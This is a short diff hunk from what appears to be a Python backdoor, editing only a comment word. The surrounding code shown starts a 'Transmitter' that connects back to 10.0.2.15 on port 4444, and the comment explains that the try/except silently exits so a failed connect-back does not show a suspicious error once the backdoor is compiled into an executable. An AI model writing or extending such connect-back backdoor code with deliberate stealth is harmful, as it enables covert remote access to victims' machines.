@@ -65,4 +65,4 @@ try:
     el_transmit = Transmitter("10.0.2.15", 4444)
     el_transmit.run()
 except Exception:
-    sys.exit()                     #...try except is used por que when we convert the backdoor into executable adn when it fails t0 connect back it produces the error msg which is very suspicious
+    sys.exit()                     #...try except is used as when we convert the backdoor into executable adn when it fails t0 connect back it produces the error msg which is very suspicious
